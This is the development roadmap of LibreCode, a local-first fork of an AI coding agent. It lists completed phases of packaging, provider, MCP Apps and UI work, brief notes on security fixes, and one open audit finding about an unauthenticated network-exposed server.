# LibreCode Roadmap

> Fork of [anomalyco/opencode v1.2.27](https://github.com/anomalyco/opencode/tree/v1.2.27)
> Goal: Local-first AI coding agent with clean architecture and community provider ecosystem.
> Last updated: 2026-04-18 | ~220 commits | Tests: 1616 pass, 0 fail | **v0.9.8** (Phase 28 complete)
>
> **Release track:** staying on `0.9.x` until we're truly 1.0-ready. No `1.0.0-preview.x` tags until the security findings in the "Pre-1.0 Hardening" section are closed out.

---

## Completed Work

### Phase 0: Foundation ✅

- GitHub Actions: 6 workflows (ci, build, release, desktop, nix, copr)
- Linux packaging: RPM/COPR, PKGBUILD/AUR, Nix flake
- Full rebrand: 377+ files, @opencode-ai → @librecode

### Phase 1: Build System ✅

- Dead deps stripped, build scripts decomposed
- Lock file clean (bun 1.3.11), test infrastructure (11 new test files)

### Phase 2: Core Architecture ✅

- Effect-ts fully removed (ADR-001). All 5 services → plain async.
- 4 namespace → barrel export migrations (MessageV2, Provider, Session, SessionPrompt)
- Provider plugin API (`ProviderPlugin` interface, `defineProvider()`, 6 loader files)
- Tool capabilities system (23 tools annotated, `ToolProfiles`, telemetry)
- Storage cleanup (ADR-002, 1,400 lines of dead JSON migration removed)

### Phase 3: Agentic SDLC ✅

- Agent loop formalized (ADR-003, state machine, 13 tests)
- Instruction compiler (6 priority tiers, source tracking, token budgets, 16 tests)
- Permission hardening (audit logging, capability-enriched requests)
- Session export/branch (versioned JSON, fork with ID remapping)
- MCP health monitor (auto-reconnect, exponential backoff, error diagnostics, 19 tests)

### Phase 4: Desktop & UI ✅

- Desktop packaging (AppStream, Flatpak manifest)
- Wayland taskbar icon fixed
- E2E test identifiers rebranded
- Desktop dev verified on Fedora 44

### Phase 5: Documentation ✅

- CLAUDE.md with coding standards, migration playbooks, quality gates
- Architecture docs, development guide, quality baseline
- ADR-001 through ADR-004
- Brand system (tokens, DESIGN-SPEC.md, site scaffolds)

### Phase 6: Provider System ✅

- Removed hosted "librecode" provider (Zen/Go subscriptions, free models, public key)
- Provider auth prompts extension (ADR-004): URL + API key + connection validation
- LiteLLM as first-class provider with auth plugin
- Ollama as first-class provider
- Local Server Discovery wizard: TCP port check, multi-endpoint probe (/v1/models + /api/tags), always visible in all dialogs, targeted remote host probing
- Local-first UI overhaul: popularProviders = [litellm, ollama, bedrock, azure], cloud providers deprioritized, "paid" concept removed

### Phase 7: npm & Community Ecosystem ✅

- `@librecode/sdk@0.1.7` published to npm (with sigstore provenance)
- `@librecode/plugin@0.1.7` published to npm (zod: `^4.1.8` — catalog: dep resolved from bun.lock)
- npm org `@librecode` created (techtoboggan)
- `~/Projects/librecode-3rdparty-providers` monorepo scaffolded (provider-anthropic, provider-openai, provider-openrouter, provider-bundle)
- GitHub Actions npm-publish.yml in both repos: NPM_TOKEN auth, sigstore provenance, catalog: dep resolution via bun.lock parsing
- `docs/providers.md` — comprehensive guide for adding new providers
- `.claude/skills/add-provider` — Claude Code skill for adding providers
- 3rdparty repo: `@librecode/provider-{anthropic,openai,openrouter,bundle}@0.1.4` published to npm

### Phase 8: Provider System Cleanup ✅

- `BUILTIN = []` — removed broken `librecode-anthropic-auth@0.0.13` npm reference
  - Generic auth fallback in `dialog-connect-provider.tsx` handles all simple API key providers
  - `loadApiKeyProviders()` generically injects stored keys for all providers
  - No BUILTIN npm plugins needed for Anthropic/OpenAI/etc.
- Ollama provider icon added to sprite sheet
- npm-publish.yml in both repos fixed: NPM_TOKEN auth, catalog: dep resolution, repository.url for provenance

---

## v0.1.0 ✅ SHIPPED

All MVP blockers resolved. npm ecosystem fully published with provenance.

| Item                                         | Status   |
| -------------------------------------------- | -------- |
| Remove stale "librecode" provider refs       | ✅       |
| Fix failing test (bun install timeout)       | ✅       |
| Stale i18n strings                           | ✅ clean |
| First-run experience (empty state hints)     | ✅       |
| Model selector context-sensitive empty state | ✅       |
| npm auth + all 6 packages published          | ✅       |
| README update                                | ✅       |

---

## v0.1.x Fast-follows ✅

### Phase 9: Ollama Auth + Wizard Cleanup ✅

| Item                                            | Description                                                                                                                    | Effort | Status  |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ------ | ------- |
| **OllamaAuthPlugin**                            | Already exists and complete in `packages/librecode/src/plugin/ollama.ts` — URL prompt, connection validation, model injection. | Medium | ✅ Done |
| **Rename litellm-wizard → local-server-wizard** | Renamed to `LocalServerWizard`, provider IDs changed from `litellm-<url>` → `local-<url>`.                                     | Small  | ✅ Done |

### Code Quality Cleanup ✅

**Complexity target achieved:** 0 violations. Every function under complexity 12.
**File size target achieved:** 0 source files over 1000 lines.

- 18 files split into focused modules (session/prompt, lsp/server, acp/agent, github, config, etc.)
- 1385/1385 tests pass.

### Phase 10: Bug Fixes + Security Hardening ✅

| Item                                 | File                              | Status  |
| ------------------------------------ | --------------------------------- | ------- |
| **Rust unused imports**              | `desktop/src-tauri/src/lib.rs`    | ✅ Done |
| **GTK main thread panic**            | `windows.rs:set_window_icon()`    | ✅ Done |
| **Dev channel plugin version**       | `config.ts:installDependencies()` | ✅ Done |
| **npm package name injection**       | `plugin/index.ts`                 | ✅ Done |
| **SSRF in /provider/scan**           | `routes/provider.ts`              | ✅ Done |
| **console.log → structured logging** | `routes/provider.ts`              | ✅ Done |
| **Partial access token in logs**     | `mcp/helpers.ts`                  | ✅ Done |

---

## v0.2.0 ✅ SHIPPED

All v0.2.0 items complete. 1385 tests pass, 0 complexity violations, 0 source files over 1000 lines.

| Item                                                                        | Status |
| --------------------------------------------------------------------------- | ------ |
| AppImage packaging                                                          | ✅     |
| Structured credential storage (`provider_credentials` table)                | ✅     |
| Provider capability detection (`detectCapabilitiesFromId`)                  | ✅     |
| Flatpak manifest scaffold (`com.librecode.desktop.yml`)                     | ✅     |
| Local server wizard: removed from manage-models, collapsed in add-providers | ✅     |
| Code quality: 0 complexity violations, 0 source files over 1000 lines       | ✅     |

---

### Phase 11: i18n Extraction ✅

| Item                              | Description                                                                             | Status       |
| --------------------------------- | --------------------------------------------------------------------------------------- | ------------ |
| **`@librecode/i18n` npm package** | New repo `techtoboggan/librecode-i18n`, 3 sub-paths (app/ui/desktop), 17 locales        | ✅ Published |
| **Monorepo migration**            | Removed 19,037 lines of duplicated locale files from app/ui/desktop packages            | ✅ Done      |
| **CI publish**                    | `npm-publish.yml` publishes `@librecode/i18n` on every `v*` tag from main repo workflow | ✅ Done      |

### Phase 12: Brand Assets ✅

| Item                    | Description                                                                                                       | Status  |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------- | ------- |
| **LC monogram SVG**     | Hand-coded stroke-based LC letterforms, teal→navy gradient, intertwining C/L paths                                | ✅ Done |
| **Full logo lockups**   | `logo-full-light.svg` + `logo-full-dark.svg` (480×268 viewBox, wordmark + tagline)                                | ✅ Done |
| **Mark variants**       | `mark-dark.svg`, `mark-light.svg`, `mark-transparent.svg` (180×180, rounded rect)                                 | ✅ Done |
| **PNG export pipeline** | `scripts/generate-brand.ts` (cairosvg+PIL) — 42 PNGs: logo, marks, favicons, Tater, OG images                     | ✅ Done |
| **Favicon set**         | favicon-16/32/48/192/512.png, apple-touch-icon.png, favicon.ico (ImageMagick composite)                           | ✅ Done |
| **Tauri app icons**     | Replaced all opencode placeholders in icons/dev+beta+prod with LC mark (32–512px + Windows Store)                 | ✅ Done |
| **Tater mascot**        | Winged capuchin monkey, golden amber fur, brand-gradient wings, kawaii potato — dark/light/transparent SVG + PNGs | ✅ Done |

---

## v0.3.x Roadmap

### Phase 13: Zero Lint Warnings ✅

| Item                              | Description                                                                                 | Status  |
| --------------------------------- | ------------------------------------------------------------------------------------------- | ------- |
| **1,933 → 0 lint warnings**       | All `noExplicitAny`, `noNonNullAssertion`, `noNamespace`, and 13 other rules eliminated     | ✅ Done |
| **TypeScript dynamic import fix** | `models-snapshot` gitignored file — variable path trick prevents CI typecheck failure       | ✅ Done |
| **COPR CI fix**                   | `grep -v src` was filtering built RPM (path contained "src-tauri") → `grep -v '\.src\.rpm'` | ✅ Done |
| **pip3 Ubuntu 24.04 fix**         | Added `--break-system-packages` for Python 3.12 externally-managed-environment              | ✅ Done |

### Phase 14: Security & Stability ✅

| Item                           | Description                                                                                                        | Status  |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------ | ------- |
| **Symlink escape fix**         | `Filesystem.containsSafe()` uses `realpath` before comparison; `Instance.containsPath()` updated                   | ✅ Done |
| **Windows cross-drive bypass** | Same `realpathSync` fix normalises drive letters on Windows                                                        | ✅ Done |
| **Linux auto-update disabled** | CLI returns early on `process.platform === "linux"`; Tauri `UPDATER_ENABLED` gated on `!cfg!(target_os = "linux")` | ✅ Done |
| **Dead code removed**          | `TodoReadTool` (definition + registry comment), `PlanEnterTool` (commented-out block) deleted                      | ✅ Done |
| **Node.js 20 → 24 in CI**      | `FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true` added to all 7 workflows                                                | ✅ Done |

---

## v0.4 Roadmap — MCP Apps (Development Operating System)

### Phase 15: MCP Apps Host — Protocol Layer ✅

**Context:** MCP Apps is an official protocol extension (`io.modelcontextprotocol/ui`, SEP-1865), live since Jan 2026. Ships in Claude Desktop, VS Code Copilot, Cursor. LibreCode must implement the **host** side. MCP servers expose a `ui://` resource with `mimeType: "text/html;profile=mcp-app"`. Host fetches it, renders in sandboxed iframe, communicates via JSON-RPC 2.0 over `postMessage`.

| Item                                     | Description                                                                                                                                           | Files                   | Effort | Status |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------- | ------ | ------ |
| **`@modelcontextprotocol/ext-apps` dep** | Added to `packages/librecode` — provides `getToolUiResourceUri`, `isToolVisibilityAppOnly`, `RESOURCE_MIME_TYPE`, `AppBridge`, `PostMessageTransport` | `package.json`          | Tiny   | ✅     |
| **`MCP.uiResources()`**                  | Filters `resources()` to `mimeType === "text/html;profile=mcp-app"`                                                                                   | `src/mcp/index.ts`      | Small  | ✅     |
| **`MCP.fetchAppHtml()`**                 | Calls `readResource` on `ui://` URI, extracts HTML text with type-safe content union narrowing                                                        | `src/mcp/index.ts`      | Small  | ✅     |
| **`MCP.getAppResourceUri()`**            | Wraps `getToolUiResourceUri()` — supports both modern `_meta.ui.resourceUri` and legacy `_meta["ui/resourceUri"]` formats                             | `src/mcp/index.ts`      | Small  | ✅     |
| **Tool visibility filter**               | `isToolVisibilityAppOnly()` skips app-only tools from agent tool list in `tools()`                                                                    | `src/mcp/index.ts`      | Small  | ✅     |
| **`mcp.app.*` bus events**               | `mcp.app.registered`, `mcp.app.tool_called` added to `MCP` barrel export                                                                              | `src/mcp/index.ts`      | Small  | ✅     |
| **15 protocol-layer tests**              | Tests for `getToolUiResourceUri`, `isToolVisibilityAppOnly`, `uiResources`, `fetchAppHtml`, `getAppResourceUri`, bus events                           | `test/mcp/apps.test.ts` | Small  | ✅     |

### Phase 16: MCP Apps Host — Desktop Rendering ✅

| Item                                 | Description                                                                                                                   | Files                                                 | Effort | Status |
| ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | ------ | ------ |
| **`McpAppPanel` component**          | Sandboxed `<iframe srcdoc=...>` + `AppBridge` + `PostMessageTransport`; CSP injection; auto-app-picker for multi-app servers  | `packages/app/src/components/mcp-app-panel.tsx` (new) | Large  | ✅     |
| **CSP injection**                    | `injectCsp()` inserts `<meta http-equiv="Content-Security-Policy">` into `<head>` before iframe render (WebkitGTK workaround) | `mcp-app-panel.tsx`                                   | Medium | ✅     |
| **`sandbox="allow-scripts"`**        | Null-origin sandbox — app can't access host cookies/localStorage; postMessage bridge works regardless                         | `mcp-app-panel.tsx`                                   | Small  | ✅     |
| **`GET /mcp/apps` endpoint**         | Lists all `ui://` resources across connected clients                                                                          | `routes/mcp.ts`                                       | Small  | ✅     |
| **`GET /mcp/apps/html` endpoint**    | Fetches HTML for a specific UI resource by server + URI                                                                       | `routes/mcp.ts`                                       | Small  | ✅     |
| **`McpAppsTab` component**           | Side-panel tab: app list → picker → renders `McpAppPanel`; empty state when no apps                                           | `mcp-app-panel.tsx`                                   | Medium | ✅     |
| **"Apps" tab in session side panel** | New tab trigger + content pane in `SessionSidePanel`; `createSessionTabs` recognizes "apps"                                   | `session-side-panel.tsx`, `helpers.ts`                | Small  | ✅     |
| **`resourceUri` in tool metadata**   | `convertMcpTool()` now attaches `_meta.ui.resourceUri` to call results — ready for inline rendering                           | `src/mcp/index.ts`                                    | Small  | ✅     |
| **i18n: `session.tab.apps`**         | Added English key `"Apps"` to `librecode-i18n`                                                                                | `librecode-i18n/src/app/en.ts`                        | Tiny   | ✅     |

### Phase 17: Activity Visualization — Backend + Desktop Panel ✅

| Item                                     | Description                                                                                                                                                                                                    | Files                                                 | Effort | Status |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | ------ | ------ |
| **`ActivityTracker` module**             | Subscribes to `message.part.updated`, `file.edited`, `agent.loop.transition` bus events; maintains `Map<sessionID, SessionActivity>` with per-file and per-agent state; publishes `activity.updated` bus event | `src/session/activity-tracker.ts` (new)               | Medium | ✅     |
| **Unsub cleanup**                        | `ActivityState` stores `unsubs: Array<() => void>`; cleanup iterates and calls all; prevents subscription leaks on instance dispose                                                                            | `activity-tracker.ts`                                 | Small  | ✅     |
| **`GET /session/:id/activity` endpoint** | Returns `SessionActivity` snapshot for the given session; seeds the frontend before live SSE events arrive                                                                                                     | `routes/session/actions.ts`                           | Small  | ✅     |
| **SSE auto-wiring**                      | `ActivityTracker.Updated` goes through `Bus.publish` → `GlobalBus.emit` → SSE stream → `global-sdk.tsx` emitter — no extra wiring needed                                                                       | `bus/index.ts` (existing pattern)                     | None   | ✅     |
| **`EventActivityUpdated` SDK type**      | Added `EventActivityUpdated`, `EventActivityFileEntry`, `EventActivityAgentEntry` to SDK types + `Event` union                                                                                                 | `packages/sdk/js/src/v2/gen/types.gen.ts`             | Small  | ✅     |
| **`ActivityTab` component**              | Fetches initial state via REST; subscribes to `activity.updated` SSE; renders agent status bar + file activity grid + legend                                                                                   | `packages/app/src/components/activity-grid.tsx` (new) | Large  | ✅     |
| **"Activity" tab in session side panel** | New tab trigger + content pane; `createSessionTabs` recognizes "activity"                                                                                                                                      | `session-side-panel.tsx`, `helpers.ts`                | Small  | ✅     |
| **i18n: `session.tab.activity`**         | Added English key `"Activity"`                                                                                                                                                                                 | `librecode-i18n/src/app/en.ts`                        | Tiny   | ✅     |

### Phase 18: opncd.ai Share Removal ✅

Removed the opncd.ai share feature entirely (not local-first, external dependency).

| Item                                         | Description                                                                                                  | Status  |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------ | ------- |
| **`share-next.ts` + `share.sql.ts` deleted** | Core share module and SQL schema removed                                                                     | ✅ Done |
| **Migration `20260414000000_remove_share`**  | `DROP TABLE session_share; ALTER TABLE session DROP COLUMN share_url`                                        | ✅ Done |
| **Session `index.ts`**                       | Removed `share`/`unshare` functions, `share` field from `Info` schema                                        | ✅ Done |
| **Config schema**                            | Removed `share`, `autoshare` fields, `session_share`/`session_unshare` keybinds                              | ✅ Done |
| **REST API**                                 | Removed `POST/DELETE /:id/share` endpoints from `routes/session/actions.ts`                                  | ✅ Done |
| **SDK types**                                | Removed `SessionShare*`, `SessionUnshare*` types; removed `share` from `Session` and `Config`                | ✅ Done |
| **TUI commands**                             | Removed `/share` and `/unshare` command entries; removed `session.share` from TUI sidebar                    | ✅ Done |
| **`run.ts --share` flag**                    | Removed `--share` CLI flag and auto-share logic                                                              | ✅ Done |
| **`import.ts`**                              | Removed URL-based import path (opncd.ai share URLs); command now handles local JSON only                     | ✅ Done |
| **GitHub action**                            | Removed `resolveShareId`, `normalizeShare`, `shareId`/`shareBaseUrl` from `RunCtx`; simplified `buildFooter` | ✅ Done |
| **Frontend**                                 | Removed share popover + share state from `session-header.tsx` and `message-timeline.tsx`                     | ✅ Done |

---

### Phase 19: TUI Activity View ✅

| Item                           | Description                                                                                                                 | Files                                               | Effort | Status |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- | ------ | ------ |
| **`session_activity` keybind** | Added `<leader>v` (v = visualize) to `config/schema.ts` keybinds — `<leader>a` already taken by agent_list                  | `src/config/schema.ts`                              | Tiny   | ✅     |
| **`ActivityPanel` component**  | Absolute-positioned overlay panel: agent status bar, recent files grid with truecolor kind indicators, stats footer, legend | `src/cli/cmd/tui/routes/session/activity.tsx` (new) | Large  | ✅     |
| **Activity command**           | `session.activity.toggle` registered in `commands.tsx`; toggle title updates with current state                             | `routes/session/commands.tsx`                       | Small  | ✅     |
| **Panel wiring in Session**    | `activityOpen` signal in `index.tsx`; renders `<ActivityPanel>` overlay; passes toggle deps to `useSessionCommands`         | `routes/session/index.tsx`                          | Small  | ✅     |

---

### Phase 20: Coverage Push ✅ (partial)

Pushed coverage from 71.74% lines → **73.55% lines** (+1.81pp) and 58.30% functions → **60.23% functions** (+1.93pp). Added 199 new unit tests across 10 test files.

| File                                    | Before | After |
| --------------------------------------- | ------ | ----- |
| `src/session/activity-tracker.ts`       | 32%    | 98%   |
| `src/provider/error.ts`                 | 67%    | 97%   |
| `src/session/instruction.ts`            | 71%    | 83%   |
| `src/tool/invalid.ts`                   | 60%    | 100%  |
| `src/tool/registry.ts`                  | 57%    | 100%  |
| `src/session/summary.ts`                | 35%    | 75%   |
| `src/provider/transform-input.ts`       | 74%    | 100%  |
| `src/session/status.ts`                 | 70%    | 100%  |
| `src/config/config.ts`                  | 64%    | 78%   |
| `src/provider/loaders/litellm.ts`       | 44%    | 100%  |
| `src/provider/loaders/openai-compat.ts` | 56%    | 100%  |
| `src/provider/loaders/cloud.ts`         | 64%    | 72%   |

**Remaining gap to 80%**: Large integration files (`processor.ts` 4%, `prompt.ts` 13%, `prompt-builder.ts` 9%, `compaction.ts` 20%) require a full running agent + LLM to test and are not suitable for unit tests. Closing that gap requires BDD/E2E tests, not unit tests.

---

### Phase 21: MCP App Pinning + Port Preview Panel ✅

| Item                               | Description                                                                                                                                                 | Files                                                   | Effort | Status |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- | ------ | ------ |
| **`Bus.PortDiscovered` event**     | New `port.discovered` bus event (sessionID, port, url) wired through GlobalBus → SSE                                                                        | `src/bus/index.ts`                                      | Tiny   | ✅     |
| **Port detection in bash tool**    | `extractPorts()` regex scans each output chunk for localhost/loopback URL patterns; deduplicates per invocation via `Set`; publishes `PortDiscovered` event | `src/tool/bash.ts`                                      | Small  | ✅     |
| **`EventPortDiscovered` SDK type** | Added to `types.gen.ts` + `Event` union so frontend can receive typed SSE events                                                                            | `packages/sdk/js/src/v2/gen/types.gen.ts`               | Tiny   | ✅     |
| **MCP App pin button**             | Pin icon (📌) next to each app in `McpAppsTab` picker; filled when pinned; `McpAppsTab` accepts `onPin`/`onUnpin`/`pinnedUris` props                        | `packages/app/src/components/mcp-app-panel.tsx`         | Small  | ✅     |
| **Pinned app tabs in sidebar**     | `pinnedApps` signal in `SessionSidePanel`; each pinned app renders its own `Tabs.Trigger` + `Tabs.Content` with `<McpAppPanel>`; middle-click or ✕ unpins   | `packages/app/src/pages/session/session-side-panel.tsx` | Medium | ✅     |
| **`PortPreviewTab` component**     | `<iframe src="http://localhost:PORT">` with a URL bar showing `localhost:PORT ↗` external link                                                             | `packages/app/src/components/port-preview.tsx` (new)    | Small  | ✅     |
| **Port preview tabs in sidebar**   | `discoveredPorts` signal + SSE subscription; each port gets a monospace `:{port}` tab; middle-click or ✕ dismisses                                          | `packages/app/src/pages/session/session-side-panel.tsx` | Small  | ✅     |
| **Unit tests for port detection**  | 17 tests covering all regex patterns, edge cases, privilege port rejection, empty input                                                                     | `test/tool/bash-port-detection.test.ts` (new)           | Small  | ✅     |

### Phase 22: v1.0.0-preview.1 Release Prep ✅

Shipped the v1.0 preview: version alignment across all three repos, release metadata, distribution infrastructure push, and dependent-repo lockstep.

| Item                                       | Description                                                                                                                                     | Files                                                                                | Status |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ------ |
| **Blocking: broken GH Action ref**         | `anomalyco/librecode/github@latest` → `techtoboggan/librecode/github@latest`                                                                    | `cli/cmd/github/install.ts:236`                                                      | ✅     |
| **Blocking: Homebrew/GitHub refs**         | Installation module + docker tip referenced wrong org                                                                                           | `installation/index.ts`, `cli/cmd/tui/component/tips.tsx`                            | ✅     |
| **Agent prompt rebrand**                   | All 8 system prompts identified the agent as "OpenCode" — rebranded to LibreCode, URLs updated                                                  | `session/prompt/*.txt`                                                               | ✅     |
| **@ts-expect-error cleanup**               | Dead-TODO comment replaced with accurate rationale (Copilot SDK intentionally omits embedding/image methods)                                    | `provider/provider.ts:78`                                                            | ✅     |
| **Version bump: main repo**                | All 7 package.json + Cargo.toml → `1.0.0-preview.1`                                                                                             | `packages/*/package.json`, `src-tauri/Cargo.toml`                                    | ✅     |
| **Config JSON schema**                     | Generator script (`z.toJSONSchema`) + output at `schema/config.json`; users reference via `$schema` URL for editor autocomplete                 | `packages/librecode/scripts/generate-config-schema.ts`, `schema/config.json`         | ✅     |
| **Flatpak: cargo-sources.json**            | `scripts/generate-flatpak-sources.sh` downloads `flatpak-cargo-generator.py` on demand and produces 1,379-entry, 405 KB `cargo-sources.json`    | `scripts/generate-flatpak-sources.sh`, `packages/desktop/flatpak/cargo-sources.json` | ✅     |
| **Flatpak: Bun sha256 to 1.3.10**          | Downgraded manifest from Bun 1.3.11 to 1.3.10 (matching workflows + package.json packageManager) with verified sha256s                          | `packages/desktop/flatpak/com.librecode.desktop.yml`                                 | ✅     |
| **Flatpak: build workflow enabled**        | Auto-computes release tarball sha256 at build time, runs `flatpak-builder`, uploads `.flatpak` bundle to GitHub Release                         | `.github/workflows/flatpak.yml`                                                      | ✅     |
| **Nix: nodejs_20 → nodejs_24**             | Bumps dev shell to match GH Actions Node 24 migration path                                                                                      | `flake.nix`                                                                          | ✅     |
| **Release workflow: preview tag handling** | `release.yml` + `desktop.yml` set `prerelease: true` when tag contains `-preview.` or `-rc.`; COPR submission skipped for preview tags          | `.github/workflows/release.yml`, `desktop.yml`                                       | ✅     |
| **Desktop AppImage enabled**               | `APPIMAGE_EXTRACT_AND_RUN=1` env var lets Tauri's AppImage bundler work without FUSE on GH Actions                                              | `.github/workflows/desktop.yml`                                                      | ✅     |
| **Schema as release artifact**             | `librecode-config-schema.json` uploaded alongside binaries on each release                                                                      | `.github/workflows/release.yml`                                                      | ✅     |
| **Homebrew formula**                       | Tap-ready formula for macOS (arm64) + Linux (x64/arm64); sha256 filled post-release                                                             | `contrib/homebrew/librecode.rb`                                                      | ✅     |
| **Universal installer: install.sh**        | OS + arch detection, SHA256SUMS verification, user-scope install, PATH hint                                                                     | `scripts/install.sh`                                                                 | ✅     |
| **Universal installer: install.ps1**       | Windows PowerShell equivalent of install.sh                                                                                                     | `scripts/install.ps1`                                                                | ✅     |
| **CHANGELOG.md (main repo)**               | Keep-a-Changelog format, full v1.0.0-preview.1 entry with known limitations + upgrade notes                                                     | `CHANGELOG.md`                                                                       | ✅     |
| **README install matrix update**           | Added one-line installer, Homebrew tap, Flatpak, `$schema` autocomplete hint                                                                    | `README.md`                                                                          | ✅     |
| **Docs index + troubleshooting**           | `docs/index.md` table of contents; `docs/troubleshooting.md` covers install, macOS gatekeeper, WebKitGTK compositing, providers, MCP, dev setup | `docs/index.md`, `docs/troubleshooting.md`                                           | ✅     |
| **i18n repo: desktop locale parity**       | Added `th.ts` + `tr.ts` to `librecode-i18n/src/desktop/`                                                                                        | `librecode-i18n/src/desktop/`                                                        | ✅     |
| **i18n repo: version bump + CHANGELOG**    | Bumped and publishing via OIDC per release cut                                                                                                  | `librecode-i18n/`                                                                    | ✅     |
| **3rd-party providers: bump + publish**    | All 4 packages publishing via OIDC on each tag                                                                                                  | `librecode-3rdparty-providers/`                                                      | ✅     |

### Phase 22a: Release Pipeline Consolidation + OIDC ✅ (v0.9.8)

After initial preview work, consolidated 6 racing workflows into a single master orchestrator and fixed npm OIDC trusted publishing end-to-end.

| Item                                           | Description                                                                                                                                 | Files                                                               | Status |
| ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------ |
| **Master release orchestrator**                | `release.yml` calls CI, npm-publish, desktop, flatpak, copr as `workflow_call` subs — no parallel racing, proper `needs:` dependencies     | `.github/workflows/release.yml` (7 stages)                          | ✅     |
| **Gate CI to PRs only**                        | `ci.yml`, `build.yml`, `nix.yml` no longer fire on push-to-main; release orchestrator runs CI via workflow_call                             | `.github/workflows/{ci,build,nix}.yml`                              | ✅     |
| **npm OIDC: no more NPM_TOKEN**                | Removed `registry-url` from `setup-node` (which wrote an `.npmrc` with broken NODE_AUTH_TOKEN interpolation that overrode OIDC)              | all 3 repos' `npm-publish.yml`                                      | ✅     |
| **npm OIDC: Node 24 pin for npm 11+**          | Node 22 ships npm 10 which predates OIDC. Pinned `node-version: "24.9.0"` — ships npm 11.x, no unpinned `@latest` supply-chain risk        | all 3 repos' `npm-publish.yml`                                      | ✅     |
| **COPR: librecode-desktop AutoReqProv**        | Disable automatic dependency scan on 132 MB binary (was hanging COPR build forever)                                                         | `packages/rpm/librecode-desktop.spec`                               | ✅     |
| **macOS signed DMG + notarization**            | Pre-unlock keychain + `set-keychain-settings -t 3600` to prevent codesign timeout on long builds                                           | `.github/workflows/desktop.yml`                                     | ✅     |
| **Bun.build success gate**                     | `Bun.build()` silently returned raw runtime on failure → added `result.success` check so compile errors fail the build step                | `packages/librecode/script/build.ts`                                | ✅     |
| **RPM strip skip for Bun binary**              | `%global __strip /bin/true` prevents rpmbuild strip from destroying the Bun-compiled binary                                                | `packages/rpm/librecode-desktop.spec`                               | ✅     |

### Phase 23: Platform-Aware File Manager Icon ✅ (Issue #1)

| Item                              | File                                                         | Status |
| --------------------------------- | ------------------------------------------------------------ | ------ |
| Tauri `getFileManagerInfo` cmd    | `packages/desktop/src-tauri/src/lib.rs`                      | ✅     |
| Platform context adapter          | `packages/app/src/context/platform.tsx`                      | ✅     |
| Generic folder icon in sprite     | `packages/ui/src/components/app-icons/sprite.svg` + types.ts | ✅     |
| Session header dynamic label      | `packages/app/src/components/session/session-header.tsx`     | ✅     |

### Phase 24: Progress Indicator + Liveness Detection ✅ (Issue #2)

| Item                          | File                                                       | Status |
| ----------------------------- | ---------------------------------------------------------- | ------ |
| StreamingIndicator component  | `packages/app/src/components/session/streaming-indicator.tsx` | ✅  |
| Stall-detector primitive      | `packages/app/src/utils/stall-detector.ts`                 | ✅     |
| Token I/O accumulators        | `packages/librecode/src/session/activity-tracker.ts`       | ✅     |
| Event SDK type extension      | `packages/sdk/js/src/v2/gen/types.gen.ts`                  | ✅     |

### Phase 25: Local Compute Guided Setup ✅ (Issue #6)

| Item                          | File                                                | Status |
| ----------------------------- | --------------------------------------------------- | ------ |
| Setup wizard component        | `packages/app/src/components/local-compute-setup.tsx` | ✅   |
| `/system/info` endpoint       | `packages/librecode/src/server/routes/system.ts`    | ✅     |
| Wizard integration            | `packages/app/src/components/local-server-wizard.tsx` | ✅   |

### Phase 26: Voice "Talk to Me" Mode ✅ (Issue #5)

| Item                     | File                                               | Status |
| ------------------------ | -------------------------------------------------- | ------ |
| `createVoiceInput` hook  | `packages/app/src/utils/voice-input.ts`            | ✅     |
| Prompt input mic button  | `packages/app/src/components/prompt-input.tsx`     | ✅     |
| Voice settings           | `packages/app/src/components/settings-general.tsx` | ✅     |
| macOS mic entitlement    | `packages/desktop/src-tauri/entitlements.plist`    | ✅     |

### Phase 27: Productivity vs Development Mode ✅ (Issue #4)

| Item                   | File                                                | Status |
| ---------------------- | --------------------------------------------------- | ------ |
| Mode context           | `packages/app/src/context/mode.tsx`                 | ✅     |
| `app_mode` config      | `packages/librecode/src/config/schema.ts`           | ✅     |
| Session-header toggle  | `packages/app/src/components/session/session-header.tsx` | ✅ |
| Tool visibility field  | `packages/librecode/src/tool/capabilities.ts`       | ✅     |

### Phase 28: MCP App Start Menu + Built-in Apps ✅ (Issue #3)

| Item                         | File                                                    | Status |
| ---------------------------- | ------------------------------------------------------- | ------ |
| Built-in app registry        | `packages/librecode/src/mcp/builtin-apps/index.ts`      | ✅     |
| FS activity graph app        | `packages/librecode/src/mcp/builtin-apps/fs-activity-graph.html` | ✅ |
| Session stats dashboard app  | `packages/librecode/src/mcp/builtin-apps/session-stats.html` | ✅ |
| Start menu popover           | `packages/app/src/components/start-menu.tsx`            | ✅     |
| SSE → iframe event forwarding| `packages/app/src/components/mcp-app-panel.tsx`         | ✅     |
| Pinned-apps context          | `packages/app/src/context/pinned-apps.tsx`              | ✅     |

---

## 🔒 Pre-1.0 Hardening (gating the 1.0.0-preview.x cut)

Full OWASP Top 10 audit performed 2026-04-18. Overall posture: **NEEDS WORK**. Address these before cutting any `1.0.0-preview.x` tag. Tracked here, not in Phase 22 (which stays closed).

### Critical / High-severity (must-fix before 1.0.0-preview.1)

| # | OWASP | Issue | Location | Effort | Status |
|---|-------|-------|----------|--------|--------|
| 1 | A05 | **`--mdns` silently binds `0.0.0.0` without password** → LAN-reachable unauth RCE. Fail-closed: require `LIBRECODE_SERVER_PASSWORD` for non-loopback hostnames, not just a warning | `packages/librecode/src/cli/network.ts:39-48`; `packages/librecode/src/cli/cmd/{web,serve}.ts` | Small | TODO |
